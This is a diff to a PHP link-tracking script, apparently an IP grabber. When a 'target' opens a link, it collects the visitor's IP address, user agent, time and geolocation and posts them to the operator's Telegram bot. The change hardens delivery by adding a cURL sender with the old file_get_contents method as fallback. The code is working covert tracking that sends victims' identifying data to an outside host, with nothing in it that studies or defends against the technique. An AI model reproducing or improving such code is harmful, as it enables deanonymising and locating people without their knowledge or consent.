@@ -62,14 +62,12 @@ if (file_exists($config_file)) {
 
 // Only send if Telegram is configured
 if (!empty($telegram_token) && !empty($telegram_chat)) {
-    // Escape special characters in message
     $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
     $message = "🔔 *New Target Opened Link*\n\n";
     $message .= "📍 *IP Address:* " . $ip_clean . "\n";
     $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
     $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
 
-    // Add geolocation to Telegram message if available
     if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
         $message .= "\n" . formatGeoForTelegram($geo);
     }
@@ -81,24 +79,37 @@ if (!empty($telegram_token) && !empty($telegram_chat)) {
         'parse_mode' => 'Markdown'
     );
 
-    $options = array(
-        'http' => array(
-            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method' => 'POST',
-            'content' => http_build_query($data),
-            'timeout' => 10,
-            'ignore_errors' => true
-        )
-    );
-
-    $context = stream_context_create($options);
-    $result = @file_get_contents($url, false, $context);
-
-    // Log errors if any
-    if ($result === false) {
-        $error = error_get_last();
-        if ($error !== null) {
-            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
+        $result = @curl_exec($ch);
+        $err = curl_error($ch);
+        curl_close($ch);
+        if ($err) {
+            @error_log("Telegram cURL error: " . $err, 3, "telegram_error.log");
+        }
+    } else {
+        $options = array(
+            'http' => array(
+                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+                'method' => 'POST',
+                'content' => http_build_query($data),
+                'timeout' => 12,
+                'ignore_errors' => true
+            )
+        );
+        $context = stream_context_create($options);
+        $result = @file_get_contents($url, false, $context);
+        if ($result === false && function_exists('error_get_last')) {
+            $e = error_get_last();
+            if ($e) {
+                @error_log("Telegram send error: " . $e['message'], 3, "telegram_error.log");
+            }
         }
     }
 }
